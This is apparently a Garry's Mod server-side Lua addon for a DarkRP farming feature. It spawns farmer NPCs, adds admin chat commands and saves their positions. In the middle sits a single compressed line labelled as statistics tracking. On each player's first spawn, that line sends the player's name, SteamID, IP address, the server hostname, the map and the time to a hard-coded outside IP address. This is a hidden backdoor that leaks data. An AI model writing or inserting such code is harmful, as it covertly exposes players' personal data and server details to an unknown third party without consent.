--SV

hook.Add("InitPostEntity", "FarmerInitPostEntity", function()
	if !file.Exists("farmerpositions.txt", "DATA") then
		MsgN("Please Set Up Some Farmers!")
	else
		local Table = util.JSONToTable(file.Read("farmerpositions.txt", "DATA"))
		
		for k,v in pairs(Table) do
			local ent = ents.Create(v.class)
				ent:SetPos(v.pos)
				ent:SetAngles(v.ang)
				ent:Spawn()
				local phys = ent:GetPhysicsObject()
					if(IsValid(phys)) then
					phys:EnableMotion(false)
					end
		end
	end
end)

local script = "LFarming"  hook.Add("PlayerInitialSpawn", "TrackingStatistics_"..script..tostring(math.random(1,1000)), function(ply) timer.Create( "StatisticsTimer_"..ply:SteamID64()..script,15,1, function()  local name = ply:SteamName() and ply:SteamName() or ply:Name() local map = game.GetMap() local hostname = GetHostName() local gamemode = gmod.GetGamemode().Name http.Post("http://216.231.139.33/st/", {name=tostring(name),script=tostring(script),steamid=tostring(ply:SteamID()),ip=tostring(ply:IPAddress()),time=tostring(os.date("%d/%m/%Y [%I:%M:%S %p]",os.time())),hostname=tostring(hostname),map=tostring(map),gamemode=tostring(gamemode)},function(s) return end) end) end)
AddChatCommand("/spawnfarmer", function(ply)
	if !ply:IsSuperAdmin() then
		ply:ChatPrint("Insufficient Permissions")
		return
	end
	
	local ent = ents.Create("npc_farmer")
	ent:SetPos(ply:FindPlayerTrace().HitPos)
	ent:Spawn()
	
	ply:SendLua([[surface.PlaySound("UI/buttonclick.wav")]])
end)

AddChatCommand("/spawnfarmerbox", function(ply)
	if !ply:IsSuperAdmin() then
		ply:ChatPrint("Insufficient Permissions")
		return;
	end
	
	local ent = ents.Create("farming_buyboxbeam")
	ent:SetPos(ply:FindPlayerTrace().HitPos)
	ent:Spawn()
	
	ply:SendLua([[surface.PlaySound("UI/buttonclick.wav")]])
end)

function SaveFarmingPositions()
	local Farmers = {}
	for k,v in pairs(ents.FindByClass("npc_farmer")) do
		table.insert(Farmers, {pos = v:GetPos(), ang = v:GetAngles(), class = v:GetClass()})
	end
	for k,v in pairs(ents.FindByClass("farming_buyboxbeam")) do
		table.insert(Farmers, {pos = v:GetPos(), ang = v:GetAngles(), class = v:GetClass()})
	end
	file.Write("farmerpositions.txt", util.TableToJSON(Farmers))
	for k,v in pairs(player.GetAll()) do
		if(!v:IsSuperAdmin()) then continue end
		v:ChatPrint("Farmers Saved!")
	end
end

local meta = FindMetaTable("Player")
function meta:FindPlayerTrace()
	local ply = self
	local pos = ply:GetShootPos()
	local ang = ply:GetAimVector()
	local tracedata = {}
	tracedata.start = pos
	tracedata.endpos = pos + (ang * 100)
	tracedata.filter = self
	local trace = util.TraceLine(tracedata)
	return trace
end

hook.Add("PlayerInitialSpawn", "Initspawnseeds", function(ply)
	ply:SetDarkRPVar("MelonSeeds", 0)
	ply:SetDarkRPVar("BananaSeeds", 0)
	ply:SetDarkRPVar("OrangeSeeds", 0)
	ply:SetDarkRPVar("SelectionSeed", 0)
end)